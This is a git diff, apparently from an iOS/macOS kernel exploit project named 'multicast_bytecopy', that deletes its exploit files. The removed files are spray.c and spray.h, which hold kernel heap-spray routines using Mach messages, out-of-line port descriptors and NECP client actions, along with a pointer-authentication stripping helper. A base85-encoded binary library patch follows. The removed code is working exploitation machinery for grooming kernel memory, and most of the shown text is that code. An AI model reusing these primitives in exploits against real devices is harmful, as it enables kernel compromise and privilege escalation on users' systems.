-    mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
-    mach_msg_header_t *msg = (mach_msg_header_t *)calloc(1, size);
-    
-    msg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
-    msg->msgh_size = size;
-    
-    for (unsigned int i = 0; i < count; ++i)
-    {
-        mach_port_construct(mach_task_self(), &options, 0, &ports[i]);
-    }
-    
-    for (unsigned int i = 0; i < count; ++i)
-    {
-        msg->msgh_remote_port = ports[i];
-        mach_msg_send(msg);
-    }
-    
-    free(msg);
-    
-    return ports;
-}
-
-mach_port_t *spray_default_kalloc_ool_ports(unsigned int size, unsigned int count, mach_port_t *ool_ports)
-{
-    return spray_default_kalloc_ool_ports_with_data_kalloc_size(size, count, ool_ports, 0x50);
-}
-
-mach_port_t *spray_default_kalloc_ool_ports_with_data_kalloc_size(unsigned int size, unsigned int count, mach_port_t *ool_ports, unsigned int data_kalloc_size)
-{
-    struct default_msg
-    {
-        mach_msg_header_t hdr;
-        mach_msg_body_t body;
-        mach_msg_ool_ports_descriptor_t desc;
-    };
-    
-    mach_port_t *ports = calloc(sizeof(mach_port_t), count);
-    mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
-    struct default_msg *msg = (struct default_msg *)calloc(1, 0x100);
-    
-    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
-    msg->hdr.msgh_bits  |= MACH_MSGH_BITS_COMPLEX;
-    msg->hdr.msgh_size = data_kalloc_size;
-    msg->body.msgh_descriptor_count = 1;
-    
-    msg->desc.deallocate = 0;
-    msg->desc.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
-    msg->desc.copy = MACH_MSG_VIRTUAL_COPY;
-    msg->desc.disposition = MACH_MSG_TYPE_COPY_SEND;
-    msg->desc.count = size/8;
-    msg->desc.address = (void *)ool_ports;
-    
-    for (unsigned int i = 0; i < count; ++i)
-    {
-        mach_port_construct(mach_task_self(), &options, 0, &ports[i]);
-    }
-    
-    for (unsigned int i = 0; i < count; ++i)
-    {
-        msg->hdr.msgh_remote_port = ports[i];
-        kern_return_t kr = mach_msg_send((mach_msg_header_t *)msg);
-        if (kr) {
-            *(int *)1 = 0;
-        }
-    }
-    
-    free(msg);
-
-    return ports;
-}
-
-void spray_default_kalloc_ool_ports_on_port(unsigned int size, unsigned int count, mach_port_t *ool_ports, mach_port_t p)
-{
-    spray_default_kalloc_ool_ports_with_data_kalloc_size_on_port(size, ool_ports, 0x50, p);
-}
-
-void spray_default_kalloc_ool_ports_with_data_kalloc_size_on_port(unsigned int size, mach_port_t *ool_ports, unsigned int data_kalloc_size, mach_port_t p)
-{
-    struct default_msg
-    {
-        mach_msg_header_t hdr;
-        mach_msg_body_t body;
-        mach_msg_ool_ports_descriptor_t desc;
-    };
-    
-    struct default_msg *msg = (struct default_msg *)calloc(1, 0x100);
-    
-    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
-    msg->hdr.msgh_bits  |= MACH_MSGH_BITS_COMPLEX;
-    msg->hdr.msgh_size = data_kalloc_size;
-    msg->body.msgh_descriptor_count = 1;
-    
-    msg->desc.deallocate = 0;
-    msg->desc.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
-    msg->desc.copy = MACH_MSG_VIRTUAL_COPY;
-    msg->desc.disposition = MACH_MSG_TYPE_COPY_SEND;
-    msg->desc.count = size/8;
-    msg->desc.address = (void *)ool_ports;
-    
-    msg->hdr.msgh_remote_port = p;
-    kern_return_t kr = mach_msg_send((mach_msg_header_t *)msg);
-    if (kr) {
-        *(int *)1 = 0;
-    }
-    
-    free(msg);
-}
-
-
-kern_return_t spray_kmsg_on_port(mach_port_t port, void *data, size_t size)
-{
-    mach_msg_base_t *msg = data;
-    msg->header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
-    msg->header.msgh_remote_port = port;
-    msg->header.msgh_size = (mach_msg_size_t)size;
-    
-    return mach_msg_send(&msg->header);
-}
-
-mach_port_t *spray_ports_with_context(unsigned int count, uint64_t context)
-{
-    mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
-    mach_port_t *ports = calloc(sizeof(mach_port_t), count);
-    
-    for (unsigned int i = 0; i < count; ++i)
-    {
-        mach_port_construct(mach_task_self(), &options, context, &ports[i]);
-    }
-    
-    return ports;
-}
-
-mach_port_t *spray_ports(unsigned int count)
-{
-    return spray_ports_with_context(count, 0);
-}
-
-int spray_default_kalloc_necp(int necp_fd, uint8_t *b, uint32_t sz)
-{
-    uint8_t if_id[0x10];
-    return necp_client_action(necp_fd, 1, if_id, sizeof(if_id), b, sz);
-}
-
diff --git a/multicast_bytecopy/exploit/spray.h b/multicast_bytecopy/exploit/spray.h
deleted file mode 100644
index c7724cf..0000000
--- a/multicast_bytecopy/exploit/spray.h
+++ /dev/null
@@ -1,23 +0,0 @@
-#ifndef __SPRAY_H__
-#define __SPRAY_H__
-
-#include <mach/mach.h>
-#include <stdint.h>
-
-mach_port_t spray_data_kalloc_kmsg_single(uint8_t *data, unsigned int size);
-mach_port_t *spray_data_kalloc_kmsg(uint8_t *data, unsigned int size, unsigned int count);
-void spray_data_kalloc_kmsg_on_ports(uint8_t *data, unsigned int size, unsigned int count, mach_port_t *ports);
-mach_port_t *spray_default_kalloc_ool_ports(unsigned int size, unsigned int count, mach_port_t *ool_ports);
-mach_port_t *spray_default_kalloc_ool_ports_with_data_kalloc_size(unsigned int size, unsigned int count, mach_port_t *ool_ports, unsigned int data_kalloc_size);
-
-void spray_default_kalloc_ool_ports_on_port(unsigned int size, unsigned int count, mach_port_t *ool_ports, mach_port_t p);
-void spray_default_kalloc_ool_ports_with_data_kalloc_size_on_port(unsigned int size, mach_port_t *ool_ports, unsigned int data_kalloc_size, mach_port_t p);
-int spray_default_kalloc_necp(int necp_fd, uint8_t *b, uint32_t sz);
-
-kern_return_t spray_kmsg_on_port(mach_port_t port, void *data, size_t size);
-
-mach_port_t *spray_ports(unsigned int count);
-mach_port_t *spray_ports_with_context(unsigned int count, uint64_t context);
-
-
-#endif
diff --git a/multicast_bytecopy/exploit/xpaci.h b/multicast_bytecopy/exploit/xpaci.h
deleted file mode 100644
index db896db..0000000
--- a/multicast_bytecopy/exploit/xpaci.h
+++ /dev/null
@@ -1,18 +0,0 @@
-// ptrauth.h replacement
-
-static uint64_t __attribute((naked)) __xpaci(uint64_t a)
-{
-    asm(".long        0xDAC143E0"); // XPACI X0
-    asm("ret");
-}
-
-static uint64_t xpaci(uint64_t a)
-{
-    // If a looks like a non-pac'd pointer just return it
-    if ((a & 0xFFFFFF0000000000) == 0xFFFFFF0000000000)
-    {
-        return a;
-    }
-    
-    return __xpaci(a);
-}
diff --git a/multicast_bytecopy/liblzfse.a b/multicast_bytecopy/liblzfse.a
deleted file mode 100644
index eb74fb58061a0c7ae85d9ab23c181d09aa2e9f22..0000000000000000000000000000000000000000
GIT binary patch
literal 0
KcmV+b0RR6000031

literal 30312
zcmV-uc9)4EJYjNUXg&%fF)uPOARr(hARr(hARr(yHZ?OeHa0mnHy|K2Ffkw?ATlr@
zARr(yFfcYWG$0@`I5;36ARr(hAYck#UoKNwO+-aTAX86LR7FGp0000e0000000000
z0RR9M000000RR9f000000RR9)000000RRA4000000RRAa0001AY<gyMWnW}vV{c?-
zUt)D;W@T~!Uu=42b7fy-Wn*t-WnX4#Y-IpnY<gyMWnW}vV{c?-Uvpz}VRU0?Uvp`C
zWdL7ndS-KFUuAA%Z)9a(Vs&O_WpV&tY<gyMWnX1(V{c?-Uvpz}VRU0?Uvp`CWdHyG
z0000ZF)uPWARr(hARr(hARr(yHZ?OeHa0mnG9Vx|Ffkw?ATlr@ARr(yFfcYWG$0@{
zIXO8tARr(hAYck?X<}@8W^-j<ZDDhCWpXZW00000000000002b`tAM<00033004ji
z000050002c0ssI2AOHXW0000P0001Z0ssI200000000000000000000000000000m
zTL1t60000G0{{R30000mTL1t6000070000700007000000001AUvy=7bN~PV00000
z0001AUsOd{Q~&?~0000000000000000001FI{*Lx0000G0{{R50000$UH|}<00000
z1OR{l00000000000001AUt@E0a%pa7000000001AUsOd{Q~&?~000000001FI{*Lx
z0000*000000001VJ^%m!0000000000000020000000000000000001AUu<b~WpZI`
zF*X1I0001AUsOd{Q~&?~0000000026I{*Lx0000W000000002MJ^%m&0000000000
z0000E0000000000000000001AUt@1>b94Xz000000001AUsOd{Q~&?~000000002c
zI{*Lx0000O6aWAK0002sJ^%m%0000000000000000000000000000000001AUtx80
zXkT!2asU7T0001AUqnGvK>z>%000000002!PXGV_00008000000002^QUCx00002!
zVgLXE000000000000000000000001AUt@1>b94Xz000000001AUqnGvK>z>%00000
z0002+PXGV_000002mk;800000Qvd)10002+VgLXD0RR910000000000000000001A
zUt@1=aA9L~Uv+MGX>Md+Ura;*00000000000002+R{#J20000$0{{R300000TL1t9
z0002+Y5)Kl00000000620000000000000020000O0001>Yybd20001>Z~y>s1ONas
z0000W00002000000uKNH0uKNI00003000000mcF;0000G0002MYXATM0000k0000G
z0002MYXAV?00000000000000000000000000000000000000000001gBLmg_d%vmu
z0|1c#005K-ERIr00ibdp00`><fQXv?d%>vx4`0@QBLmg{g8|X{X921BUjnK2R|Bc^
zPXwv`dj+ZeLjjTW0|Tn{0|Kh{0|Bb@0|2V|0|TmmAOP{>1OQa`0|cs{{y*`E0{~R{
z0~D&?MgZ|61OQZcG60dmLIBa=0~o5}0~M;{0~D&{0~e|Q005Nv0~D$N0|2!70~D$s
z02J$@0svG<%#KnB&#iLkQvfO83jn$313>v;3IMri0s#3)%#KnBkEC)4YaqA)Kmd^-
z000!=0~e|RERIq^0ibdK005NW0~e|Q005Nv0~D&@0{}Dt0D#iycONpJ0toAf0svHq
zG60bu0T$~h0svG<%#KnBucdP6X8<Ya13>xq0~4yqh5-2B0~V^`0~M;`0~D$N005N8
z0u+l$%#KnCkEC)50RXuO0Tasr5de|>dqt`APeiHqS3{}zUqY$+XF;j|g8`BM4`0^v
z&H|}u0v3zt9sv3E0s#350Duzc0~D(H0~D(N4gmR|0txHm0svHq0H9Ln1_1fs0~e|Q
z005L=001-q0D#iz|Nj>l0iaU(0~D(G1_1fs0~e|Q005ML0suAO0~e}+0H9I;005LI
z13}R#147X${ZiBU0|=_A{{OWZ0YTB|1_1fs0~e|Q005NW_y0BE0~e|Q005ML_y0BM
z7C`v`0Tav6|Nj>`13}TZ|Nj?%BLmg=U%aXIR{^Q?PXej^djqNc!vK-<0|Tn`0|Kh`
z0|Bb`0|2VT0RXh%0~V^`0~M;`0~D&`0~4zKdqb)8PeQ5oS3#-xU&N^YBLmgY2Oi2$
z0PwaTjyTi+000yK005K-ERIr00ibdp00`>{fQXs^1ptu%005ML0RXi30|2Vv0~V^`
z0~M;`0~D&`0~4y`0~e|Q005Np0|2Vv0~e|Q005NW0~4zKdqb)8PeQ5oS3#-xU&N^Y
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
